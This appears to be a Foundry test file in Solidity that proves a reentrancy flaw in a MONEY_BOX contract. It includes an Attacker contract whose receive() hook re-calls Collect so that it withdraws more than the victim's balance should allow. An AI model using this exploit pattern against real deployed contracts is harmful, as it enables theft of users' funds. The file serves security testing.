
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX} from "../src/MONEY_BOX.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetLogFile(address(_logContract));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 4);
        
        uint256 depositAmount = attackVal * 2;
        
        vm.deal(address(_contractUnderTest), depositAmount);
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);
        
        vm.warp(block.timestamp + 100);
        
        _attacker.setupAttack{value: depositAmount}(depositAmount, attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialVictimBalance;
    uint256 public initialAttackerBalance;

    constructor(address victimAddress) {
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 depositAmount, uint256 attackVal) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = attackVal;
        
        victim.Put{value: depositAmount}(0);
        
        initialVictimBalance = address(victim).balance;
        initialAttackerBalance = address(this).balance;
    }

    function attack(uint256 attackVal) public {
        initialVictimBalance = address(victim).balance;
        initialAttackerBalance = address(this).balance;
        
        victim.Collect(attackVal);
        
        uint256 finalVictimBalance = address(victim).balance;
        uint256 finalAttackerBalance = address(this).balance;
        
        uint256 expectedVictimBalance = initialVictimBalance - (attackVal * 2);
        uint256 actualVictimBalance = finalVictimBalance;
        
        exploitSucceeded = (attackCallCount == 2) && (actualVictimBalance < expectedVictimBalance);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (attackCallCount == 2) {
                victim.Collect(storedAttackVal);
            }
        }
    }
}
